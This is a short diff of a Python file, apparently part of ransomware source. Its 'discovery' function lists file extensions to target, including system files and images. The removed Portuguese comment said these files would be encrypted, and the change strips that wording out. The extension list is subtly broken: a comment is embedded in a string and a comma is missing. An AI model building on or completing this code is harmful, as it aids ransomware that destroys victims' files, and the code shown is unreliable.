@@ -3,7 +3,7 @@ import os
 
 def discovery(initial_path):
 
-    # tipos de arquivos que serao criptografados
+    # tipos de arquivos 
     extensions = [
          'exe','dll','so','rpm','deb','vmlinuz','img #Arquivos do sistema'
         'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw'  # imagens
